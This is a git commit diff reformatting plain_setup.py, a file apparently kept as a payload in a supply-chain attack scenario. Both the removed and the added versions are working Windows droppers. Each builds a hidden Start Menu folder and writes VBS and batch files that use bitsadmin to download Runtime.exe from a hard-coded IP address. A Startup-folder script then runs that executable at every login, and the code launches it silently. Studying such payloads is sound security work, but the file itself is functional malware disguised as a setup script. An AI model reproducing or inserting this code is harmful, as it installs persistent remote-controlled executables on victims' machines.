153b3fa156fcef6a862509951ab3fc7f256423fe
Wapiti08 <tzrzhuoran@gmail.com>
2025-12-09 14:29:48 +0000

    update setup.py

--- scenarios/sc2/payload/plain_setup.py
+++ scenarios/sc2/payload/plain_setup.py
@@ -2,25 +2,39 @@ import os
 import subprocess
 login = os.getlogin()
 
-if os.path.exists(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
-\System64\\') == False:
-    os.mkdir(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
-    \System64")
-    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\
-    \WIN32.vbs", "a").write(f'Set WshShell = CreateObject("WScript.Shell") \nWshShell. Run chr(34) & "C:\
-    \Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\WIN32.bat" &
-    Chr(34), 0\nSet WshShell = Nothing')
-    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
-    \WIN64.vbs", "a").write(f'''Set WshShell = CreateObject("WScript.Shell") \nWshShell. Run chr(34) & "C:\
-    \Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe" &
-    Chr(34), 0\nSet WshShell = Nothing''')
-    open(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\
-    \WIN32.bat", "a").write(f'''bitsadmin /transfer mydownloadjob /download/priority FOREGROUND
-    "http://20.93.23.234:8081/dl/runtime" "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\
-    \Start Menu\\Programs\\System64\\Runtime.exe" \nstart "" "C:\\Users\\{login}\\AppData\\Roaming\
-    \Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WIN64.vbs"''')
-    subprocess.run(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\
-    \System64\\WIN32.vbs", shell=True, check=True)
-else:   
+path_system64 = f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64"
+path_startup   = f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+
+if not os.path.exists(path_system64):
+    os.mkdir(path_system64)
+
+    # --- WIN32.vbs ---
+    with open(f"{path_system64}\\WIN32.vbs", "a") as f:
+        f.write(
+            'Set WshShell = CreateObject("WScript.Shell")\n'
+            f'WshShell.Run chr(34) & "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\WIN32.bat" & Chr(34), 0\n'
+            'Set WshShell = Nothing'
+        )
+
+    # --- WIN64.vbs ---
+    with open(f"{path_startup}\\WIN64.vbs", "a") as f:
+        f.write(
+            'Set WshShell = CreateObject("WScript.Shell")\n'
+            f'WshShell.Run chr(34) & "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe" & Chr(34), 0\n'
+            'Set WshShell = Nothing'
+        )
+
+    # --- WIN32.bat ---
+    with open(f"{path_system64}\\WIN32.bat", "a") as f:
+        f.write(
+            f'bitsadmin /transfer mydownloadjob /download /priority FOREGROUND '
+            f'"http://20.93.23.234:8081/dl/runtime" '
+            f'"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe"\n'
+            f'start "" "{path_startup}\\WIN64.vbs"'
+        )
+
+    # --- Execute VBS ---
+    subprocess.run(f'"{path_system64}\\WIN32.vbs"', shell=True, check=True)
+
+else:
     pass
-# print("hi installing...")
